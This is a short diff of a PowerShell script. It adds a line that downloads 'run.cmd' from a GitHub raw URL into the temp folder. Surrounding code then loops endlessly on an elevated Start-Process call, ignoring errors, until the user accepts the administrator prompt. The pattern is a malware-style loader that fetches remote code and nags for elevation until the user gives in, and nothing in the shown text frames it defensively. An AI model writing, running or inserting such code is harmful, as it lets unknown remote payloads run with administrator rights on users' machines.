@@ -12,6 +12,8 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.
 
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
+    
     while(1){try{Start-Process -Verb RunAs -FilePath '$temp\run.cmd';exit}catch{}}
 }
 
